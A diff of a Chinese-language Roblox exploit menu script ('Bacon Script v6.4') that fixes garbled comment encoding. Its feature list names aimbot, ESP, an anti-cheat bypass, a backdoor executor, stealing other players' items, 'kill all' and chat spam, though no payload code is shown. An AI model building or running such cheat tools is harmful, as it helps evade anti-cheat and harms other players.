@@ -1,7 +1,7 @@
 local function loadScript()
     if not game:IsLoaded() then game.Loaded:Wait() end
     
-    -- 鑾峰彇鏈嶅姟
+    -- 获取服务
     local Services = {
         Players = game:GetService("Players"),
         RunService = game:GetService("RunService"), 
@@ -24,13 +24,13 @@ local function loadScript()
         LocalPlayer = Players.LocalPlayer
     end
 
-    -- 鍒涘缓UI
+    -- 创建UI
     local ScreenGui = Instance.new("ScreenGui")
     ScreenGui.Name = "BaconScriptGUI_" .. math.random(10000,99999)
     ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
     ScreenGui.Parent = CoreGui
     
-    -- 涓荤獥鍙ｏ紙鍑忓皬涓夊垎涔嬩竴锛�
+    -- 主窗口（减小三分之一）
     local MainFrame = Instance.new("Frame")
     MainFrame.Size = UDim2.new(0, 467, 0, 300)
     MainFrame.Position = UDim2.new(0.5, -233.5, 0.5, -150)
@@ -42,7 +42,7 @@ local function loadScript()
     MainFrame.Visible = false
     MainFrame.Parent = ScreenGui
     
-    -- 娣诲姞闃村奖鏁堟灉
+    -- 添加阴影效果
     local Shadow = Instance.new("ImageLabel")
     Shadow.Size = UDim2.new(1, 13, 1, 13)
     Shadow.Position = UDim2.new(0, -6.5, 0, -6.5)
@@ -54,7 +54,7 @@ local function loadScript()
     Shadow.SliceCenter = Rect.new(10, 10, 118, 118)
     Shadow.Parent = MainFrame
     
-    -- 澧炲己鍦嗚鏁堟灉
+    -- 增强圆角效果
     local MainCorner = Instance.new("UICorner", MainFrame)
     MainCorner.CornerRadius = UDim.new(0, 11)
     
@@ -62,7 +62,7 @@ local function loadScript()
     MainStroke.Color = Color3.fromRGB(0, 150, 255)
     MainStroke.Thickness = 1.3
     
-    -- 鑳屾櫙鍥剧墖锛堜繚鐣欏師鏈琔I鑳屾櫙锛�
+    -- 背景图片（保留原本UI背景）
     local BackgroundImage = Instance.new("ImageLabel")
     BackgroundImage.Size = UDim2.new(1, 0, 1, 0)
     BackgroundImage.BackgroundTransparency = 1
@@ -73,7 +73,7 @@ local function loadScript()
     Instance.new("UICorner", BackgroundImage).CornerRadius = UDim.new(0, 11)
     BackgroundImage.Parent = MainFrame
     
-    -- 鏍囬鏍�
+    -- 标题栏
     local TitleBar = Instance.new("Frame")
     TitleBar.Size = UDim2.new(1, 0, 0, 27)
     TitleBar.BackgroundColor3 = Color3.fromRGB(20, 20, 40)
@@ -87,7 +87,7 @@ local function loadScript()
     TitleLabel.Size = UDim2.new(1, -67, 1, 0)
     TitleLabel.Position = UDim2.new(0, 10, 0, 0)
     TitleLabel.BackgroundTransparency = 1
-    TitleLabel.Text = "鍩规牴鑴氭湰 v6.4"
+    TitleLabel.Text = "培根脚本 v6.4"
     TitleLabel.TextColor3 = Color3.fromRGB(0, 255, 255)
     TitleLabel.TextSize = 20
     TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
@@ -95,7 +95,7 @@ local function loadScript()
     TitleLabel.ZIndex = 6
     TitleLabel.Parent = TitleBar
     
-    -- 鎺у埗鎸夐挳
+    -- 控制按钮
     local MinimizeButton = Instance.new("TextButton")
     MinimizeButton.Size = UDim2.new(0, 20, 0, 20)
     MinimizeButton.Position = UDim2.new(1, -47, 0, 3.5)
@@ -122,7 +122,7 @@ local function loadScript()
     Instance.new("UICorner", CloseButton).CornerRadius = UDim.new(0, 5.3)
     CloseButton.Parent = TitleBar
     
-    -- 閫夐」鍗″尯鍩燂紙宸︿晶锛�- 淇敼涓哄彲婊氬姩
+    -- 选项卡区域（左侧）- 修改为可滚动
     local TabFrame = Instance.new("Frame")
     TabFrame.Size = UDim2.new(0, 100, 1, -27)
     TabFrame.Position = UDim2.new(0, 0, 0, 27)
@@ -132,7 +132,7 @@ local function loadScript()
     Instance.new("UICorner", TabFrame).CornerRadius = UDim.new(0, 11)
     TabFrame.Parent = MainFrame
     
-    -- 涓诲唴瀹瑰尯鍩燂紙鍙充晶锛�
+    -- 主内容区域（右侧）
     local MainContent = Instance.new("Frame")
     MainContent.Size = UDim2.new(1, -100, 1, -27)
     MainContent.Position = UDim2.new(0, 100, 0, 27)
@@ -140,16 +140,16 @@ local function loadScript()
     MainContent.ZIndex = 3
     MainContent.Parent = MainFrame
     
-    -- 閫夐」鍗★紙閲嶆柊缁勭粐锛屾寜浣犵殑瑕佹眰閲嶆柊鎺掑簭锛�
+    -- 选项卡（重新组织，按你的要求重新排序）
     local Tabs = {
-        "鍏憡", "鍩虹鍔熻兘", "绉诲姩鍔熻兘", "鐜╁浜や簰", "澶栬鍔熻兘", "涓栫晫鍔熻兘", 
-        "FE鍔熻兘", "榛戞礊鍔熻兘", "鍏朵粬鑴氭湰", "doors", "鍋疯蛋鑴戠孩", "绉嶆鑺卞洯", 
-        "鍏朵粬鑴氭湰鏁村悎", "淇勪亥淇勫窞", "鐢绘垜", "鍏嶈垂r甯�", "姝讳骸涔嬫", "琚仐寮�", "鏃犳晫灏戜緺椋炶"
+        "公告", "基础功能", "移动功能", "玩家交互", "外观功能", "世界功能", 
+        "FE功能", "黑洞功能", "其他脚本", "doors", "偷走脑红", "种植花园", 
+        "其他脚本整合", "俄亥俄州", "画我", "免费r币", "死亡之死", "被遗弃", "无敌少侠飞行"
     }
     local TabButtons = {}
-    local CurrentTab = "鍏憡"
+    local CurrentTab = "公告"
     
-    -- 鍒涘缓鍙粴鍔ㄧ殑閫夐」鍗″鍣�
+    -- 创建可滚动的选项卡容器
     local TabScrolling = Instance.new("ScrollingFrame")
     TabScrolling.Size = UDim2.new(1, 0, 1, 0)
     TabScrolling.Position = UDim2.new(0, 0, 0, 0)
@@ -186,7 +186,7 @@ local function loadScript()
         TabButtons[tabName] = tabButton
     end
     
-    -- 鍐呭鍖哄煙锛堜娇鐢ㄥ垪琛ㄥ竷灞€锛屽崟鍒楁寜閽級
+    -- 内容区域（使用列表布局，单列按钮）
     local ContentScrolling = Instance.new("ScrollingFrame")
     ContentScrolling.Size = UDim2.new(1, -6.7, 1, -6.7)
     ContentScrolling.Position = UDim2.new(0, 3.3, 0, 3.3)
@@ -198,7 +198,7 @@ local function loadScript()
     ContentScrolling.ZIndex = 4
     ContentScrolling.Parent = MainContent
     
-    -- 浣跨敤UIListLayout
+    -- 使用UIListLayout
     local ContentList = Instance.new("UIListLayout", ContentScrolling)
     ContentList.Padding = UDim.new(0, 5.3)
     ContentList.SortOrder = Enum.SortOrder.LayoutOrder
@@ -207,7 +207,7 @@ local function loadScript()
     Instance.new("UIPadding", ContentScrolling).PaddingRight = UDim.new(0, 3.3)
     Instance.new("UIPadding", ContentScrolling).PaddingTop = UDim.new(0, 3.3)
     
-    -- 鍒涘缓鎸夐挳鍑芥暟锛堝崟鍒楁寜閽級
+    -- 创建按钮函数（单列按钮）
     local function createButton(text, description)
         local buttonFrame = Instance.new("Frame")
         buttonFrame.Size = UDim2.new(1, -6.7, 0, 30)
@@ -274,267 +274,267 @@ local function loadScript()
         return buttonFrame, button
     end
 
-    -- 閲嶆柊缁勭粐鍔熻兘鍒嗙被锛堟寜鐓т綘鐨勮姹傦級
+    -- 重新组织功能分类（按照你的要求）
     local FunctionTabs = {
-        ["鍩虹鍔熻兘"] = {
-            {name = "NoclipButton", text = "绌垮妯″紡 [鍏抽棴]", desc = "绌块€忔墍鏈夊澹佸拰鐗╀綋"},
-            {name = "InfiniteJumpButton", text = "鏃犻檺璺宠穬 [鍏抽棴]", desc = "鍦ㄧ┖涓篃鑳芥棤闄愯烦璺�"},
-            {name = "SpeedButton", text = "绉诲姩閫熷害: 16", desc = "鐐瑰嚮鍒囨崲绉诲姩閫熷害"},
-            {name = "JumpButton", text = "璺宠穬楂樺害: 50", desc = "鐐瑰嚮鍒囨崲璺宠穬楂樺害"},
-            {name = "PlayerButton", text = "閫夋嫨鐜╁: 鏃�", desc = "閫夋嫨鐩爣鐜╁"},
-            {name = "ClimbWallButton", text = "鐖妯″紡 [鍏抽棴]", desc = "纰板埌澧欒嚜鍔ㄤ笂鍗�"},
-            {name = "ClimbWallV2Button", text = "鐖v2", desc = "鍔犺浇鐖v2鑴氭湰"},
-            {name = "AntiFallButton", text = "闃叉憯(澶氱偣鍑犳)", desc = "闃叉浠庨珮澶勬帀钀藉彈浼�"},
-            {name = "SuicideButton", text = "鑷潃", desc = "绔嬪嵆姝讳骸"},
-            {name = "FlyButton", text = "椋炶", desc = "鍔犺浇椋炶鑴氭湰"},
-            {name = "InvincibleButton", text = "鏃犳晫", desc = "鍔犺浇鏃犳晫鑴氭湰"},
-            {name = "InvincibleV2Button", text = "鏃犳晫v2", desc = "鍔犺浇鏃犳晫v2鑴氭湰"},
-            {name = "InvincibleV3Button", text = "鏃犳晫v3", desc = "鍔犺浇鏃犳晫v3鑴氭湰"},
-            {name = "CollisionBoxButton", text = "鏄剧ず纰版挒绠� [鍏抽棴]", desc = "鏄剧ず鐗╀綋纰版挒绠�"},
-            {name = "WalkAirButton", text = "韪忕┖琛岃蛋", desc = "鍔犺浇韪忕┖琛岃蛋鑴氭湰"},
-            {name = "PlayerESPButton", text = "閫忚鐜╁ [鍏抽棴]", desc = "閫忚鏄剧ず鍏朵粬鐜╁杞粨"},
-            {name = "BulletTrackButton", text = "瀛愬脊杩借釜 [鍏抽棴]", desc = "瀛愬脊鑷姩杩借釜鏈€杩戠帺瀹�"},
-            -- 绉婚櫎瀵肩涓績鍜岄槻韪紝绉诲姩鍒板叾浠栬剼鏈暣鍚�
-            {name = "AntiKickButton", text = "闃茶涪", desc = "鍔犺浇闃茶涪鑴氭湰"},
-            -- 鏂版坊鍔犵殑鍔熻兘
-            {name = "SpamButton", text = "鍒峰睆", desc = "鑱婂ぉ鍒峰睆宸ュ叿"},
-            {name = "FEBaconPrankButton", text = "FE鍩规牴鑴氭湰闄勫睘鎭舵悶", desc = "FE鍩规牴鑴氭湰闄勫睘鎭舵悶鑴氭湰"},
-            -- 鏂板鍔熻兘
-            {name = "FaceNearbyButton", text = "寰幆闈㈠悜闄勮繎鐜╁ [鍏抽棴]", desc = "寰幆闈㈠悜鏈€杩戠殑鐜╁"},
-            {name = "BackNearbyButton", text = "寰幆鑳屽闄勮繎鐜╁ [鍏抽棴]", desc = "寰幆鑳屽鏈€杩戠殑鐜╁"},
-            {name = "AntiPullbackButton", text = "闃叉媺鍥� [鍏抽棴]", desc = "闃叉鍙嶄綔寮婃媺鍥�"},
-            -- 鏂版坊鍔犵殑鍚庨棬鎵ц鍣�
-            {name = "BackdoorExecutorButton", text = "鍚庨棬鎵ц鍣�", desc = "鍔犺浇鍚庨棬鎵ц鍣ㄨ剼鏈�"}
+        ["基础功能"] = {
+            {name = "NoclipButton", text = "穿墙模式 [关闭]", desc = "穿透所有墙壁和物体"},
+            {name = "InfiniteJumpButton", text = "无限跳跃 [关闭]", desc = "在空中也能无限跳跃"},
+            {name = "SpeedButton", text = "移动速度: 16", desc = "点击切换移动速度"},
+            {name = "JumpButton", text = "跳跃高度: 50", desc = "点击切换跳跃高度"},
+            {name = "PlayerButton", text = "选择玩家: 无", desc = "选择目标玩家"},
+            {name = "ClimbWallButton", text = "爬墙模式 [关闭]", desc = "碰到墙自动上升"},
+            {name = "ClimbWallV2Button", text = "爬墙v2", desc = "加载爬墙v2脚本"},
+            {name = "AntiFallButton", text = "防摔(多点几次)", desc = "防止从高处掉落受伤"},
+            {name = "SuicideButton", text = "自杀", desc = "立即死亡"},
+            {name = "FlyButton", text = "飞行", desc = "加载飞行脚本"},
+            {name = "InvincibleButton", text = "无敌", desc = "加载无敌脚本"},
+            {name = "InvincibleV2Button", text = "无敌v2", desc = "加载无敌v2脚本"},
+            {name = "InvincibleV3Button", text = "无敌v3", desc = "加载无敌v3脚本"},
+            {name = "CollisionBoxButton", text = "显示碰撞箱 [关闭]", desc = "显示物体碰撞箱"},
+            {name = "WalkAirButton", text = "踏空行走", desc = "加载踏空行走脚本"},
+            {name = "PlayerESPButton", text = "透视玩家 [关闭]", desc = "透视显示其他玩家轮廓"},
+            {name = "BulletTrackButton", text = "子弹追踪 [关闭]", desc = "子弹自动追踪最近玩家"},
+            -- 移除导管中心和防踢，移动到其他脚本整合
+            {name = "AntiKickButton", text = "防踢", desc = "加载防踢脚本"},
+            -- 新添加的功能
+            {name = "SpamButton", text = "刷屏", desc = "聊天刷屏工具"},
+            {name = "FEBaconPrankButton", text = "FE培根脚本附属恶搞", desc = "FE培根脚本附属恶搞脚本"},
+            -- 新增功能
+            {name = "FaceNearbyButton", text = "循环面向附近玩家 [关闭]", desc = "循环面向最近的玩家"},
+            {name = "BackNearbyButton", text = "循环背对附近玩家 [关闭]", desc = "循环背对最近的玩家"},
+            {name = "AntiPullbackButton", text = "防拉回 [关闭]", desc = "防止反作弊拉回"},
+            -- 新添加的后门执行器
+            {name = "BackdoorExecutorButton", text = "后门执行器", desc = "加载后门执行器脚本"}
         },
-        ["绉诲姩鍔熻兘"] = {
-            {name = "SpinButton", text = "浜虹墿鏃嬭浆 [鍏抽棴]", desc = "璁╀汉鐗╂寔缁棆杞�"},
-            {name = "SpinSpeedButton", text = "鏃嬭浆閫熷害: 10", desc = "璋冩暣鏃嬭浆閫熷害"},
-            {name = "AutoMoveButton", text = "鑷姩绉诲姩 [鍏抽棴]", desc = "鑷姩鍚戝墠绉诲姩"}
+        ["移动功能"] = {
+            {name = "SpinButton", text = "人物旋转 [关闭]", desc = "让人物持续旋转"},
+            {name = "SpinSpeedButton", text = "旋转速度: 10", desc = "调整旋转速度"},
+            {name = "AutoMoveButton", text = "自动移动 [关闭]", desc = "自动向前移动"}
         },
-        ["鐜╁浜や簰"] = {
-            -- 鍒犻櫎楠戝湪鍒汉澶翠笂銆佸湪鍒汉澶翠笂鏃嬭浆銆佺鏉€鎵€鏈変汉
-            {name = "TeleportAllButton", text = "浼犻€佹墍鏈変汉鍒版垜", desc = "鎶婃墍鏈夌帺瀹朵紶閫佸埌浣犺韩杈�"},
-            {name = "ViewBackpackButton", text = "鏌ョ湅鐜╁鑳屽寘", desc = "鏌ョ湅骞跺伔鍙栧叾浠栫帺瀹剁殑鐗╁搧"},
-            {name = "ClickTeleportButton", text = "鐐瑰嚮浼犻€�", desc = "鍔犺浇鐐瑰嚮浼犻€佸伐鍏疯剼鏈�"},
-            {name = "AimbotButton", text = "鑷瀯 [鍏抽棴]", desc = "鑷姩鐬勫噯鏈€杩戠帺瀹讹紝鍙€夊ご閮�/韬綋"},
-            {name = "AutoSpinNearestButton", text = "寰幆鏃嬭浆鏈€杩戠帺瀹� [鍏抽棴]", desc = "鑷姩鍦ㄩ檮杩戞渶杩戠帺瀹跺ご涓婃棆杞�"}
+        ["玩家交互"] = {
+            -- 删除骑在别人头上、在别人头上旋转、秒杀所有人
+            {name = "TeleportAllButton", text = "传送所有人到我", desc = "把所有玩家传送到你身边"},
+            {name = "ViewBackpackButton", text = "查看玩家背包", desc = "查看并偷取其他玩家的物品"},
+            {name = "ClickTeleportButton", text = "点击传送", desc = "加载点击传送工具脚本"},
+            {name = "AimbotButton", text = "自瞄 [关闭]", desc = "自动瞄准最近玩家，可选头部/身体"},
+            {name = "AutoSpinNearestButton", text = "循环旋转最近玩家 [关闭]", desc = "自动在附近最近玩家头上旋转"}
         },
-        ["澶栬鍔熻兘"] = {
-            {name = "PlayerSizeButton", text = "鐜╁澶у皬: 1", desc = "璋冩暣鐜╁浣撳瀷澶у皬"}
+        ["外观功能"] = {
+            {name = "PlayerSizeButton", text = "玩家大小: 1", desc = "调整玩家体型大小"}
         },
-        ["涓栫晫鍔熻兘"] = {
-            {name = "GravityButton", text = "閲嶅姏璁剧疆: 196.2", desc = "淇敼娓告垙閲嶅姏"},
-            {name = "NightVisionButton", text = "澶滆妯″紡 [鍏抽棴]", desc = "寮€鍚瑙嗗姛鑳斤紝榛戞殫鐜鍙樹寒"},
-            {name = "UIColorButton", text = "UI棰滆壊璋冭妭", desc = "闅忔満鏀瑰彉UI棰滆壊涓婚"}
+        ["世界功能"] = {
+            {name = "GravityButton", text = "重力设置: 196.2", desc = "修改游戏重力"},
+            {name = "NightVisionButton", text = "夜视模式 [关闭]", desc = "开启夜视功能，黑暗环境变亮"},
+            {name = "UIColorButton", text = "UI颜色调节", desc = "随机改变UI颜色主题"}
         },
-        ["FE鍔熻兘"] = {
-            {name = "FEFacialButton", text = "FE琛ㄦ儏", desc = "鍔犺浇FE琛ㄦ儏鑴氭湰"},
-            {name = "FEHugButton", text = "fe鎷ユ姳", desc = "鍔犺浇FE鎷ユ姳鑴氭湰"},
-            {name = "FECrouchButton", text = "fe韫蹭笅", desc = "鍔犺浇FE韫蹭笅鑴氭湰"},
-            {name = "FESkyboxButton", text = "FE澶╃┖鐩� (瑕佷拱UGC鍗″瘑锛�113633503026070)", desc = "鍔犺浇FE澶╃┖鐩掕剼鏈�"},
-            {name = "FESwordButton", text = "fe鍦ｅ墤", desc = "鍔犺浇FE鍦ｅ墤鑴氭湰"},
-            {name = "FECarButton", text = "FE浜虹墿鍙樿溅", desc = "灏嗕汉鐗╁彉鎴愭苯杞﹀舰鎬�"},
-            {name = "FESpiderManButton", text = "FE铚樿洓渚�", desc = "鍔犺浇FE铚樿洓渚犺剼鏈�"},
-            {name = "FER6AnimationsButton", text = "FER6鍔ㄤ綔", desc = "鍔犺浇R6瑙掕壊鍔ㄤ綔鑿滃崟"},
-            {name = "FEHamsterBallButton", text = "FE婊氳泲", desc = "鍔犺浇FE浠撻紶鐞冭剼鏈�"},
-            {name = "FEAutoPianoButton", text = "FE鑷姩寮归挗鐞�", desc = "鑷姩寮瑰閽㈢惔"},
-            {name = "FEControlNPCButton", text = "FE鎺у埗NPC", desc = "鍔犺浇FE鎺у埗NPC鑴氭湰"},
-            {name = "FEForsakenAnimButton", text = "FE琚仐寮冨姩浣�", desc = "鍔犺浇FE琚仐寮冨姩浣滆剼鏈�"},
-            {name = "FE096Button", text = "fe鍚堥泦", desc = "鍔犺浇FE鍚堥泦鑴氭湰"},
-            {name = "FEHam00dButton", text = "fe ham00d鑿滃崟", desc = "鍔犺浇FE ham00d鑿滃崟鑴氭湰"},
-            {name = "CatAnimButton", text = "鐚姩浣�", desc = "鍔犺浇鐚姩浣滆剼鏈�"},
-            {name = "FEAK47Button", text = "FE AK47", desc = "鍔犺浇FE AK47鑴氭湰"},
-            {name = "FESniperButton", text = "FE 鐙欏嚮鏋�", desc = "鍔犺浇FE鐙欏嚮鏋剼鏈�"},
-            {name = "FER6DeerCanButton", text = "FEr6楣跨綈", desc = "鍔犺浇FEr6楣跨綈鑴氭湰"},
-            {name = "FER15DeerCanButton", text = "FEr15楣跨綈", desc = "鍔犺浇FEr15楣跨綈鑴氭湰"},
-            {name = "FECoolKidButton", text = "FE閰峰皬瀛�", desc = "鍔犺浇FE閰峰皬瀛╄剼鏈�"},
-            {name = "FEJasonButton", text = "FE鏉版．", desc = "鍔犺浇FE鏉版．鑴氭湰"},
-            {name = "FESnakeButton", text = "FE铔�", desc = "鍔犺浇FE铔囪剼鏈�"},
-            {name = "FEBaseballPlayerButton", text = "FE妫掔悆鎵�", desc = "鍔犺浇FE妫掔悆鎵嬭剼鏈�"},
-            {name = "FEVRButton", text = "FE vr", desc = "鍔犺浇FE vr鑴氭湰"},
-            {name = "FE1x1x1x1Button", text = "FE榄旂帇1x1x1x1", desc = "鍔犺浇FE榄旂帇1x1x1x1鑴氭湰"},
-            {name = "FEHotlineRifleButton", text = "FE鐑嚎鏋啗", desc = "鍔犺浇FE鐑嚎鏋啗鑴氭湰"},
-            {name = "FEIronFistButton", text = "FE閾佹嫵", desc = "鍔犺浇FE閾佹嫵鑴氭湰"},
-            -- 鏂版坊鍔犵殑FE鍔熻兘
-            {name = "FEScriptIntegrationV2Button", text = "FE鑴氭湰鏁村悎v2", desc = "鍔犺浇FE鑴氭湰鏁村悎v2鑴氭湰"},
-            {name = "FENuoliButton", text = "FE璇轰附", desc = "鍔犺浇FE璇轰附鑴氭湰"},
-            {name = "FEIntegrationV3Button", text = "FE鏁村悎v3", desc = "鍔犺浇FE鏁村悎v3鑴氭湰"},
-            {name = "FEAC6MusicVulnerabilityButton", text = "FE AC6婕忔礊鏀鹃煶涔�", desc = "鍔犺浇FE AC6婕忔礊鏀鹃煶涔愯剼鏈�"},
-            -- 鏂版坊鍔犵殑FE鍔熻兘
-            {name = "FECreeperButton", text = "FE鑻﹀姏鎬�", desc = "鍔犺浇FE鑻﹀姏鎬曡剼鏈�"},
-            {name = "FEGatlingButton", text = "FE鍔犵壒鏋�", desc = "鍔犺浇FE鍔犵壒鏋楄剼鏈�"},
-            {name = "FEBoxingButton", text = "FE鎷冲嚮", desc = "鍔犺浇FE鎷冲嚮鑴氭湰"},
-            {name = "FEMotorcycleButton", text = "FE鎽╂墭杞�", desc = "鍔犺浇FE鎽╂墭杞﹁剼鏈�"},
-            {name = "FEBanHammerButton", text = "FE灏佺涔嬮敜", desc = "鍔犺浇FE灏佺涔嬮敜鑴氭湰"},
-            {name = "FEGatling2Button", text = "FE鍔犵壒鏋�2", desc = "鍔犺浇FE鍔犵壒鏋�2鑴氭湰"},
-            {name = "FEFightingAnimButton", text = "FE鏍兼枟鍔ㄤ綔", desc = "鍔犺浇FE鏍兼枟鍔ㄤ綔鑴氭湰"},
-            {name = "FER6HeadlessButton", text = "FE R6鏃犲ご", desc = "鍔犺浇FE R6鏃犲ご鑴氭湰"},
-            {name = "FER15HeadlessButton", text = "FE R15鏃犲ご", desc = "鍔犺浇FE R15鏃犲ご鑴氭湰"},
-            {name = "FEN00kla5KButton", text = "FE N00kla5K鑿滃崟", desc = "鍔犺浇FE N00kla5K鑿滃崟鑴氭湰"},
-            -- 鏂版坊鍔犵殑FE绱㈠凹鍏�
-            {name = "FESonicButton", text = "FE绱㈠凹鍏�", desc = "鍔犺浇FE绱㈠凹鍏嬭剼鏈�"},
-            -- 鏂板FE鍔熻兘
-            {name = "FEVillainButton", text = "FE鍙嶆淳鏈壊", desc = "鍔犺浇FE鍙嶆淳鏈壊鑴氭湰"},
-            {name = "FESuperGirlButton", text = "FE濂宠秴浜�", desc = "鍔犺浇FE濂宠秴浜鸿剼鏈�"},
-            {name = "FEFreeAnimationButton", text = "FE鍏嶈垂鍔ㄧ敾鍖�", desc = "鍔犺浇FE鍏嶈垂鍔ㄧ敾鍖呰剼鏈�"},
-            {name = "FEGetCoilsButton", text = "FE鑾峰彇鍚勭绾垮湀鑴氭湰", desc = "鍔犺浇FE鑾峰彇鍚勭绾垮湀鑴氭湰"},
-            -- 鏂版坊鍔犵殑FE鎭堕瓟
-            {name = "FEDemogorgonButton", text = "FE鎭堕瓟", desc = "鍔犺浇FE鎭堕瓟鑴氭湰"},
-            -- 鏂版坊鍔犵殑FEr6鍔ㄤ綔浼樺寲
-            {name = "FER6AnimationOptimizationButton", text = "FEr6鍔ㄤ綔浼樺寲", desc = "鍔犺浇FEr6鍔ㄤ綔浼樺寲鑴氭湰"},
-            -- 鏂版坊鍔犵殑FE鍫曡惤涔嬬
-            {name = "FEFallenGodButton", text = "FE鍫曡惤涔嬬", desc = "鍔犺浇FE鍫曡惤涔嬬鑴氭湰"},
-            -- 鏂版坊鍔犵殑FE绾㈣壊绱㈠凹鍏�
-            {name = "FERedSonicButton", text = "FE绾㈣壊绱㈠凹鍏�", desc = "鍔犺浇FE绾㈣壊绱㈠凹鍏嬭剼鏈�"},
-            -- 鏂版坊鍔犵殑FE exe绱㈠凹鍏�
-            {name = "FEExeSonicButton", text = "FE exe绱㈠凹鍏�", desc = "鍔犺浇FE exe绱㈠凹鍏嬭剼鏈�"},
-            -- 鏂版坊鍔犵殑FE灏忓
-            {name = "FEChildButton", text = "FE灏忓", desc = "鍔犺浇FE灏忓鑴氭湰"},
-            -- 鏂版坊鍔犵殑FE鏈烘浜哄伓
-            {name = "FEMechanicalDollButton", text = "FE鏈烘浜哄伓", desc = "鍔犺浇FE鏈烘浜哄伓鑴氭湰"},
-            -- 鏂版坊鍔犵殑FE灏忔苯杞﹁剼鏈�
-            {name = "FECarScriptButton", text = "FE灏忔苯杞﹁剼鏈�", desc = "鍔犺浇FE灏忔苯杞﹁剼鏈�"},
-            -- 鏂版坊鍔犵殑FE1x4灏忓紵
-            {name = "FE1x4MinionButton", text = "FE1x4灏忓紵", desc = "鍔犺浇FE1x4灏忓紵鑴氭湰"},
-            -- 鏂版坊鍔犵殑FE kill鎵€鏈変汉
-            {name = "FEKillAllButton", text = "FE kill鎵€鏈変汉", desc = "鍔犺浇FE kill鎵€鏈変汉鑴氭湰"},
-            -- 鏂版坊鍔犵殑FE璁剧疆鐜╁澶у皬
-            {name = "FESetPlayerSizeButton", text = "FE璁剧疆鐜╁澶у皬", desc = "鍔犺浇FE璁剧疆鐜╁澶у皬鑴氭湰"},
-            -- 鏂版坊鍔犵殑FE澧ㄦ按浜�
-            {name = "FEInkManButton", text = "FE澧ㄦ按浜�", desc = "鍔犺浇FE澧ㄦ按浜鸿剼鏈�"},
-            -- 鏂版坊鍔犵殑FE鎺у埗npcV2
-            {name = "FEControlNPCV2Button", text = "FE鎺у埗npcV2", desc = "鍔犺浇FE鎺у埗npcV2鑴氭湰"},
-            -- 鏂版坊鍔犵殑FE鐢电鏋�
-            {name = "FEElectromagneticGunButton", text = "FE鐢电鏋�", desc = "鍔犺浇FE鐢电鏋剼鏈�"},
-            -- 鏂版坊鍔犵殑6涓狥E鍔熻兘
-            {name = "FEDanceButton", text = "FE鑸炶箞", desc = "鍔犺浇FE鑸炶箞鑴氭湰"},
-            {name = "FEClownButton", text = "FE灏忎笐", desc = "鍔犺浇FE灏忎笐鑴氭湰"},
-            {name = "FEGiantDanceButton", text = "FE宸ㄤ汉璺宠垶", desc = "鍔犺浇FE宸ㄤ汉璺宠垶鑴氭湰"},
-            {name = "FERunButton", text = "FE濂旇窇", desc = "鍔犺浇FE濂旇窇鑴氭湰"},
-            {name = "FEScareButton", text = "FE鎯婂悡", desc = "鍔犺浇FE鎯婂悡鑴氭湰"},
-            {name = "FEWeirdBodyButton", text = "FE濂囨€綋鍨�", desc = "鍔犺浇FE濂囨€綋鍨嬭剼鏈�"}
+        ["FE功能"] = {
+            {name = "FEFacialButton", text = "FE表情", desc = "加载FE表情脚本"},
+            {name = "FEHugButton", text = "fe拥抱", desc = "加载FE拥抱脚本"},
+            {name = "FECrouchButton", text = "fe蹲下", desc = "加载FE蹲下脚本"},
+            {name = "FESkyboxButton", text = "FE天空盒 (要买UGC卡密：113633503026070)", desc = "加载FE天空盒脚本"},
+            {name = "FESwordButton", text = "fe圣剑", desc = "加载FE圣剑脚本"},
+            {name = "FECarButton", text = "FE人物变车", desc = "将人物变成汽车形态"},
+            {name = "FESpiderManButton", text = "FE蜘蛛侠", desc = "加载FE蜘蛛侠脚本"},
+            {name = "FER6AnimationsButton", text = "FER6动作", desc = "加载R6角色动作菜单"},
+            {name = "FEHamsterBallButton", text = "FE滚蛋", desc = "加载FE仓鼠球脚本"},
+            {name = "FEAutoPianoButton", text = "FE自动弹钢琴", desc = "自动弹奏钢琴"},
+            {name = "FEControlNPCButton", text = "FE控制NPC", desc = "加载FE控制NPC脚本"},
+            {name = "FEForsakenAnimButton", text = "FE被遗弃动作", desc = "加载FE被遗弃动作脚本"},
+            {name = "FE096Button", text = "fe合集", desc = "加载FE合集脚本"},
+            {name = "FEHam00dButton", text = "fe ham00d菜单", desc = "加载FE ham00d菜单脚本"},
+            {name = "CatAnimButton", text = "猫动作", desc = "加载猫动作脚本"},
+            {name = "FEAK47Button", text = "FE AK47", desc = "加载FE AK47脚本"},
+            {name = "FESniperButton", text = "FE 狙击枪", desc = "加载FE狙击枪脚本"},
+            {name = "FER6DeerCanButton", text = "FEr6鹿罐", desc = "加载FEr6鹿罐脚本"},
+            {name = "FER15DeerCanButton", text = "FEr15鹿罐", desc = "加载FEr15鹿罐脚本"},
+            {name = "FECoolKidButton", text = "FE酷小孩", desc = "加载FE酷小孩脚本"},
+            {name = "FEJasonButton", text = "FE杰森", desc = "加载FE杰森脚本"},
+            {name = "FESnakeButton", text = "FE蛇", desc = "加载FE蛇脚本"},
+            {name = "FEBaseballPlayerButton", text = "FE棒球手", desc = "加载FE棒球手脚本"},
+            {name = "FEVRButton", text = "FE vr", desc = "加载FE vr脚本"},
+            {name = "FE1x1x1x1Button", text = "FE魔王1x1x1x1", desc = "加载FE魔王1x1x1x1脚本"},
+            {name = "FEHotlineRifleButton", text = "FE热线枪膛", desc = "加载FE热线枪膛脚本"},
+            {name = "FEIronFistButton", text = "FE铁拳", desc = "加载FE铁拳脚本"},
+            -- 新添加的FE功能
+            {name = "FEScriptIntegrationV2Button", text = "FE脚本整合v2", desc = "加载FE脚本整合v2脚本"},
+            {name = "FENuoliButton", text = "FE诺丽", desc = "加载FE诺丽脚本"},
+            {name = "FEIntegrationV3Button", text = "FE整合v3", desc = "加载FE整合v3脚本"},
+            {name = "FEAC6MusicVulnerabilityButton", text = "FE AC6漏洞放音乐", desc = "加载FE AC6漏洞放音乐脚本"},
+            -- 新添加的FE功能
+            {name = "FECreeperButton", text = "FE苦力怕", desc = "加载FE苦力怕脚本"},
+            {name = "FEGatlingButton", text = "FE加特林", desc = "加载FE加特林脚本"},
+            {name = "FEBoxingButton", text = "FE拳击", desc = "加载FE拳击脚本"},
+            {name = "FEMotorcycleButton", text = "FE摩托车", desc = "加载FE摩托车脚本"},
+            {name = "FEBanHammerButton", text = "FE封禁之锤", desc = "加载FE封禁之锤脚本"},
+            {name = "FEGatling2Button", text = "FE加特林2", desc = "加载FE加特林2脚本"},
+            {name = "FEFightingAnimButton", text = "FE格斗动作", desc = "加载FE格斗动作脚本"},
+            {name = "FER6HeadlessButton", text = "FE R6无头", desc = "加载FE R6无头脚本"},
